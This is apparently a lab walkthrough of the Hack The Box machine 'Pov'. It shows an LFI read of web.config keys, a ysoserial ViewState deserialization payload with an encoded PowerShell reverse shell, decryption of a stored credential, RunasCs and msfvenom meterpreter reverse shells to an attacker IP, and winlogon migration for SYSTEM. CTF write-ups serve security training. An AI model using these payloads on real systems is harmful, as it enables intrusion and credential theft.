### POV - 10.10.11.251 - pov.htb

## Enumeration

- Ports: 80

- Subdomain: dev.pov.htb

- Web Directory: Nothing out of the ordinary

- `http://dev.pov.htb/portfolio/contact.aspx` is potentially vulnerable

- Intercept the traffic gives:

```
POST /portfolio/contact.aspx HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.pov.htb/portfolio/contact.aspx
Content-Type: application/x-www-form-urlencoded
Content-Length: 331
Origin: http://dev.pov.htb
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

__VIEWSTATE=5xhSVm9PVH0qQQO418xjXtndz9LrSGiCLatEjauBprvGAvd2NMM%2FZRjK2JEcWx8K8TUF4gX45NQFAfB5785FiLeoyh4%3D&__VIEWSTATEGENERATOR=37310E71&__EVENTVALIDATION=3ClgV0YTVijGX1xx3azaeW3OA4hOiRusuqM6%2Bl%2FQMfTyxOyEzmjVSJv0Q3Et6Zwy4km5GWL4PCymxer33y9IBtRWwToMsRICkhDYSUeo3fXY5T2eUH2SPSckS6xhhA1gteDP3Q%3D%3D&message=a&submit=Send+Message
```

Viewstate is used in ASP .NET (Viewstate also exist in other languages or frameworks but since this machine is windows so ASP .NET seems the most convenient here)

```
View state is a kind of hash map (or at least you can think of it that way) that ASP.NET uses to store all the temporary information about a page - like what options are currently chosen in each select box, what values are there in each text box, which panel are open, etc. You can also use it to store any arbitrary information.
```
http://stackoverflow.com/questions/2305297/ddg#2305310

```
ViewState serves as the default mechanism in ASP.NET to maintain page and control data across web pages. During the rendering of a page's HTML, the current state of the page and values to be preserved during a postback are serialized into base64-encoded strings. These strings are then placed in hidden ViewState fields.
```
https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter?source=post_page-----7516c938c688--------------------------------


## Intial access
# Deserialization 

We can try different methods listed on hacktricks and check which one works for us, if none then we would proceed to manual exploitation


- On default.aspx there is a `Download CV` and that is the potential way to get initial access and there exists LFI

First confirmed by seeing the hosts file on the machine and LFI exits

- Reading the web config file is the next step (probably), it is not located at the default location i.e. 
`C:\inetpub\wwwroot\MyWebApp\web.config`

- Found web.config......

# Request
```
POST /portfolio/default.aspx HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.pov.htb/portfolio/default.aspx
Content-Type: application/x-www-form-urlencoded
Content-Length: 370
Origin: http://dev.pov.htb
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=apfNt9iOpyj4Le5tebXEEOkTa0Wlzs5pkZE1SjHhcj0K1JuEQ7UtHr2Y0%2BgOBXzH7E3fl6dzp%2B55lKvErJxYOJLi%2FDo%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=7%2FZ00VuwgN3IL4O9BqoE2TdWm2SIGqkG3PV1Hfs4MpYHoCLhmxPWRz9wDH3B%2Bl%2F9%2Bke7VOqhEs91Xbq%2BLxmYsxVEzHOcV9UReTqa%2BO7imuqhlBillX7iDZt1FM0VU6e1srnnTQ%3D%3D&file=/web.config
```

# Response
```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/octet-stream
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=/web.config
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Wed, 07 Feb 2024 14:23:58 GMT
Connection: close
Content-Length: 866

<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```


- The decryptionKey and validationKey must be of some use somewhere.

## Reverse shell

https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter?source=post_page-----7516c938c688--------------------------------#:~:text=If%20you%20are%20lucky%20and%20the%20key%20is%20found%2Cyou%20can%20proceed%20with%20the%20attack%20using%20YSoSerial.Net%3A

Command:
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA3ACIALAA5ADAAMAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" --generator=8E0F0FA3 --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```
`--generator = {__VIWESTATEGENERATOR parameter value}`


base64 shell:

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA3ACIALAA5ADAAMAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="


```
On running `ysoserial` with proper values

```
PS C:\Users\Ayaan\Downloads\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -p ViewState  -g TextFormattingRunProperties --path="/portfolio/default.aspx" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA3ACIALAA5ADAAMAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
08v538MtHBZoHQ9btqGQPX1gxKxjBYsQJUFjzpDHlOlpRPMxwcCQTgRElSuAMfZh0KGlmfLhodCpR%2B9LGuDhTlAqW%2BIzkcq1stVZ7PfRcgdRws1tXQgYvyLAYvnjX1HPAwdYPLL6n6mQFLqbW3AFckzMlPVKoJtQk8VEv95qv6CpJATGEBDSHe9eQL%2FmjlJTMi9mOetq9VCJrkvQdIlqPq4qFA3T1ScOlmN9ZatLv%2BNuHl9glJPWUFteqpnsDRkjEPWUxBpcTXy0LHgbLIrsXpBMM%2BvxLHjs7fw66drJWys52bQjS8hWDHMRO0z%2Blh2b7hQRvyoHAOcIBb4Gv9R53z8%2BA4xRmIeKG1c7TEmzEUdYfYEq38TYZF8dnLOsY%2F1t%2FnbAtivZQ5qRfNxV8WSTGPiFsnls4FcJLJpTOzWc8TvB9EgX8IMye3Te6KT%2BG9c3PXEmDcGR6sU4TOtyeJ7qMwQRa7%2B9k0eRrJdeYTbI95MpwtJpg81Q%2Blo5v3bctVjdgEOX38NlflOWJoiXP8hDHvnv78ZkkYwxHgKKIuRjBWUguat8iuOxmzqZftf47YldcWrt9fF8juFjojC9hQtwvEGNq8QemvAULTjxuJon0qjrK9qLU9eCwTfmbcRN2UcGog58gU5mzE3km80UT6lM2f%2FC8sshxs7SNgTsNQi56dV9af%2BEcycfdctUey6ioApzw2MIAaMuGaNEkwcJ8VZxUd5j0x0ei3wUkg94JbrtmUAz%2BdYwBLRCI7PAClkXu8VDqujXUyamts%2Bs4XfoyIwn1GILRHjg1CY%2BEv%2FIlHlnb6Z6tuXf6yxM24nX1dXfAb4dbYFH2TOJzha6zi7rTiKgAFOnzK63tlfLLLKe8UZBSraYNlw4V%2FhW96ru5CgMfSC9r7KVUane01q1RGGa4UFPduDynvLTz32gZkYsx6mKRnWFmfrX6r%2FE3se1IdX1USjaaYLbf5RB29CXAJ1kCexTsgAzxWlfY3szaZxFcJJ%2FnZgIgkR0m%2B0rGHkr5M6sfaLpVlzW6x3XhWP5mQtzJGt0Ik%2BnyYMoJPdkTQLIO1vWJXcsxjQV2SspbCbvG4Yf%2BvFHSrmQPdJuUncPNuHGp97qEsemW1vlzBoqkHCwLtb5aJEw%2BKFKI0DYH7zlwS%2BXAK3Z51%2FVBRWcoQikyWWbxqnEtcC2yO2GXA70vC2gIEKBBUS1yeEixLsZUcDGcwrXorxyxN%2BLGZnFQMn9bkI7KMxQY5q49FUt3tsK%2BPNLawJ6IT4fEcQg%2BufmL5HRgr18HA9Le32B7eFE%2Baj4UE0uPlXv96oFooyIxrolWsqe7cNF%2BygnU%2BF7cjbHSJ0z6SN8vNnFBg7wK7ZynwMwRgeT2tRDvnzaLlFbs4kUnS5fEAvE73tegffKj6mUXBNjbqiWcl4QiBJ7Kgdo3Wx%2FQrBNsaWgWEGvKEM9NwOqGs7D8yGgedELEgp7evy7%2B3FlHFbm4HPwGDq4CpgCdBLXutkumka52uzeit%2FEw%2B2wGHnFJrkDII87Mr1gum%2BCEZN5DJGukv4O5f3%2BqFH00Xc0tA3iu0EOp%2FfRqwtKWx8fHZ5JL8RXsfWtouczPWAD5t2UxBHw5xG%2Bml75ydyXY3G4wQJzdUUTBQ6LnMcLNb58dfeur6MNa%2BiwkcJ0jVgZ3tEk929fRSLO%2FdxBBLeGBHFYHO3s2dcsOgggk2lxjyyC0smXv%2BBREnu0V43qlr6EBIrmwCG2HvsBNHF268vVY3%2Bsr4ew2X%2FSnJyXp7aSXwu5laN6mWjHQiT9WezsaK4xQjq2qF7FSOwvKkqdSJfwyU%2FdCRmx%2Bq0G2FORiGbm56I7fQw1S%2BUn%2FBe2OnIdp4epMnT%2FrvLRkjSQKp6WdeU3%2BsheFw61M9XHBUf1E4kO4cC%2FSYQeDjTI0wWkAcyZb%2BoKb%2FJKpnUgh5eamD11Kh8cdG3da9LmUNAyHADu4jLiBBApW96weVuvRVpUQNXd%2BzbnJFp7GCGiGW9%2BNBzxOJMJeFVg0KnUALETS74GEtTKBkYDLiI8%2FeurmU1FGbJYatCvu3rYlHV%2F2zeymjR9%2F9IlCW0HGC3%2FgYpsxvVOLuc1%2FHUbZfMEIIPIunn%2F5BM35B%2FvcCWVhz0OrSG0bJT%2BH%2BsR0Gw15MUMzsCjXY1cmlYAQWD2muP67YVKK2syYMjMydEVK61u6OGlxS6B84xG08oDSO7VVZ%2BoIEaMs7px8JbjV3ARDYEWFFipBsJJkk40mlNmSU6aVOuzzQkei7kZLlxnYPhT7v9IazdcEGnCPhoKWynEKcy5i4r1CdfBkNCfqH2JKCAdR2GvR1tPLbm3hB0t%2BqhqOyPxsl4hmh%2BeaE9rB26iXnb7HY0MpMIhzof0t9W68J4R2Jl3bUse2D3WymFDMikjSgePefE3%2BvPJAfqrSe1J6IT%2BABvyZ6DCTu0a85KrUz6ACoTjNA79Q9H3k2zxWbEjaolAu%2FBuitazfcJthif83SdoCfSVnBPCRiP4OHcKMEVT65Htn5gIFtcby0DNp0133pXv1OoKhzchWsJt6gxxZOREJKZ%2B%2B2A%2FklMXH9%2Bj3amgRdaF9T2RxPnQMSRJ3o8wgl2yIByf9F2mZCl6mf2F2IjUbfr2s96cKSV75dNp680csi6h4ivjUf%2B3tgdhoJg0obW2fXJLmZWJt04B21u4GXBPyh%2FV3NL3RCNIrMY%2FuEcxupxUaPRn0kerXkRPceMm4kL5XmgvwzWhMWmC715%2BS9kqTJK%2BvJOgzucshrU7nfGzqJMZlI4O5RLh9QSPl6y2vFVAPlyz%2Bx4b7WVqIj%2BcpecDwvNhn7X5Q4sNXyxCgkB8wPFI7rzG3CnnpguCZowBA6d1QJaysvTV3CQRyzZgGmiLxQXJgGl9LbvGAegGEJYImRKi8BEfzhvmACh%2BiHs9MGnHRQ1dz4Ax8gZrXSR94gqOWCHlsIooZCT%2BZ%2BswOMUBNG4hb0GvURfJO7ENC69hLqty%2BAbyhW8s3uHoFyt2GzzKiIuPeuwFp6VWEEK1dy%2FDA6W67%2BhV6YKm62%2BDU%2BkatnA21YB2afAftt7dsvzYmTbia5dbken9V6UEw0H4t82TyyHDE0N9HbSuEw%3D%3D

```

```
$username = 'alaading'
$password = 'f8gQ8fynP44ek1m3'
```


- Runascs.exe is a handy tool here 

- We are user `sfitz`, need to escalate privilege

- Found a connection.xml file which has some hash associating user `alaading`

```
PS C:\Users\sfitz\Documents> type connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>

```
https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx?source=post_page-----75ab061c8adc--------------------------------

`$credential = Import-CliXml -Path  <PathToXml>\MyCredential.xml`
`$credential.GetNetworkCredential().Password`


- Transfer `runascs` via `curl` and add a `-o` flag to curl command so that the file is actually saved


```
PS C:\Users\sfitz\Desktop> .\Runascs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.16.37:9001

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-121365$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 2880 created in background.

```

```
$rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.37] from (UNKNOWN) [10.10.11.251] 49771
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
pov\alaading

```
User flag can be obtained from here


Checking privileges of alaading user

```
C:\Users\alaading\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

```


- Created a payload with msfvenom
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.37 LPORT=1402 -f exe -o a.exe`

Transferred it to the machine

- Opened a listener on metasploit for windows

```
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp

```

- Execute the file on the machine and start the listener

- After getting meterpreter session
```
(Meterpreter 2)(C:\Users\alaading\Desktop) > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeDebugPrivilege
SeIncreaseWorkingSetPrivilege

```
- On the target machine

- Check the processes list by using `ps` and look for winlogon.exe

` 1448  2940  winlogon.exe    x64   2                      C:\Windows\System32\winlogon.exe
`

- On the attacker machine
```
Migrate to process 1448

(Meterpreter 2)(C:\Users\alaading\Desktop) > migrate 1448
[*] Migrating from 3920 to 1448...
[*] Migration completed successfully.
(Meterpreter 2)(C:\Windows\system32) > shell
Process 3444 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
